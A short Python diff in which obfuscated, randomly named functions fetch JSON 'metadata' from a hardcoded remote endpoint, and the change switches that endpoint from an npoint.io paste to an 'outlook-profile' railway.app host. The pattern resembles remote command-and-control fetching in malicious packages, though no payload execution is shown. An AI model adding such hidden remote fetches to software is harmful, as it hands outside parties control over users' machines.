@@ -18,7 +18,7 @@ def net_toxdjr_827():
 
     def process_lyxgmx_342():
         try:
-            data_mqwgwe_739 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_mqwgwe_739 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_mqwgwe_739.raise_for_status()
             data_bayapz_755 = data_mqwgwe_739.json()
             data_afpvlf_384 = data_bayapz_755.get('metadata')
